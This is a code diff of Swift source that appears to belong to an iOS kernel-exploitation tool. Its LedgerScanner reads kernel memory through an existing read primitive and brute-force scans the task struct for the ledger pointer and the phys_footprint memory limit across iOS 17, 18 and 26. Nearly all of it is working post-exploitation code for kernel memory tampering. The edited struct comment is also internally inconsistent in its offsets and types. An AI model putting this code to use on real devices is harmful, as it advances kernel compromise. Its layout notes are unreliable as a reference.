@@ -44,10 +44,9 @@
 //      ...
 //  }
 //  struct ledger {
-//      uint64_t          lock_word;      // +0x00  spinlock (value < 0x10000)
-//      uint32_t          l_refs;         // +0x08
-//      uint32_t          l_size;         // +0x0C
-//      ledger_template_t *l_template;    // +0x10  kernel pointer
+//      int32_t           l_refs;     // +0x00   small refcount
+//      int32_t           l_size;     // +0x04
+//      ledger_template_t l_template; // +0x08 ← kernel pointer
 //      struct ledger_entry l_entries[];  // +0x18  (most XNU; may shift)
 //  }
 //  struct ledger_entry {                 // sizeof = 0x60 (iOS 17/18/26)
@@ -186,37 +185,71 @@ final class LedgerScanner {
             }
         }
 
-        // ── 3. Find ledger pointer in task struct ──────────────────────────
-        note("3. locating ledger pointer in task struct")
-        guard let taskBuf = kreadBytes(myTask, count: 0x200, mgr: mgr) else {
+        // ── 3. Find ledger pointer — proof by contents, not header heuristic ──────
+        //
+        // Scan every 8-byte-aligned word in the task struct for a kernel pointer.
+        // For each candidate, read up to 0x500 bytes and check whether the region
+        // contains knownLimitBytes (exact match) or a plausible le_limit value
+        // (plausibility). The first hit is our ledger pointer.
+        //
+        // This is immune to struct layout shifts across iOS 17/18/26 because it
+        // never assumes a specific field order inside struct ledger — it only
+        // requires that the le_limit value is present somewhere in the first 0x500
+        // bytes of the region, which is always true since phys_footprint is entry 7.
+        //
+        note("3. locating ledger pointer (proof-by-contents scan)")
+        guard let taskBuf = kreadBytes(myTask, count: 0x300, mgr: mgr) else {
             return fail("kread of task struct failed", log: log)
         }
 
         var ledgerPtr:       UInt64 = 0
         var off_task_ledger: UInt64 = 0
 
-        // Candidate offsets in approximate probability order for iOS 17/18/26.
-        for off: UInt64 in [0x98, 0x88, 0x90, 0xA0, 0xA8, 0x80, 0xB0, 0xC0, 0x70] {
-            guard Int(off) + 8 <= taskBuf.count else { continue }
+        // Walk every aligned word in the task struct. Start at 0x40 to skip early
+        // scalar fields; stop at 0x280 which is well past any known ledger offset.
+        for off in Swift.stride(from: UInt64(0x40), through: UInt64(0x280), by: 8) {
+            guard Int(off) + 8 <= taskBuf.count else { break }
             let candidate = taskBuf.withUnsafeBytes {
                 $0.load(fromByteOffset: Int(off), as: UInt64.self)
             }
             guard isKernelPtr(candidate) else { continue }
 
-            // Ledger heuristic: lock_word at +0x00 is a small integer; l_template
-            // at +0x10 is a valid kernel pointer.
-            guard let hdr = kreadBytes(candidate, count: 24, mgr: mgr) else { continue }
-            let w0 = hdr.withUnsafeBytes { $0.load(fromByteOffset:  0, as: UInt64.self) }
-            let w2 = hdr.withUnsafeBytes { $0.load(fromByteOffset: 16, as: UInt64.self) }
-            guard w0 < 0x10000, isKernelPtr(w2) else { continue }
+            // Read up to 0x500 bytes from the candidate region.
+            // ledger_entry[7] sits at roughly offset 0x18 + 7*0x60 = 0x2A8, so
+            // 0x500 is conservative enough to always include it.
+            guard let region = kreadBytes(candidate, count: 0x500, mgr: mgr) else { continue }
+
+            var regionContainsLimit = false
+            region.withUnsafeBytes { raw in
+                var i = 0
+                while i + 8 <= raw.count {
+                    let v = raw.load(fromByteOffset: i, as: Int64.self)
+                    let hit: Bool
+                    if let known = knownLimitBytes {
+                        hit = (v == known)
+                    } else {
+                        // Plausibility: positive, < 16 GB, exactly MB-aligned.
+                        // This is strict enough to avoid false positives in any
+                        // other kernel struct reachable from the task pointer.
+                        hit = v > 100 * 1024 * 1024 &&
+                        v < 16  * 1024 * 1024 * 1024 &&
+                        (v % (1024 * 1024)) == 0
+                    }
+                    if hit { regionContainsLimit = true; return }
+                    i += 8
+                }
+            }
+
+            guard regionContainsLimit else { continue }
 
             ledgerPtr       = candidate
             off_task_ledger = off
             note("   off_task_ledger = +0x\(h(off)) → ledger @ 0x\(h(candidate))")
             break
         }
+
         guard ledgerPtr != 0 else {
-            return fail("ledger pointer not found in task struct", log: log)
+            return fail("ledger pointer not found in task struct — try cmd8 check below", log: log)
         }
 
         // ── 4. Locate le_limit via candidate combination search ────────────
